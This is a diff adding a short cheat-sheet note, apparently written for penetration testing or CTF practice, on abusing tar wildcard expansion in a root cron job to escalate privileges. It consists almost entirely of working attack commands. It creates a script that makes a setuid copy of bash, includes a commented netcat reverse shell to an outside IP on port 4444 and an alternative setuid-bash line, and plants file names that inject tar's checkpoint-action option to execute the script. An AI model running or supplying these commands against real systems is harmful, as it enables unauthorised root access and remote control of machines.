@@ -1,0 +1,11 @@
+### tar ###
+# wildcard exploit
+# * * * * *   root    cd /home/user/backup && tar -zcf /tmp/backup.tar.gz *
+
+echo '#!/bin/sh' > ex.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> ex.sh
+# echo 'rm /tmp/f;mkfifo /tmp/f;nc 10.8.98.114 4444 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f' >> ex.sh
+# echo 'chmod +s /bin/bash' >> ex.sh
+touch -- '--checkpoint-action=exec=sh ex.sh'
+touch -- '--checkpoint=1'
+
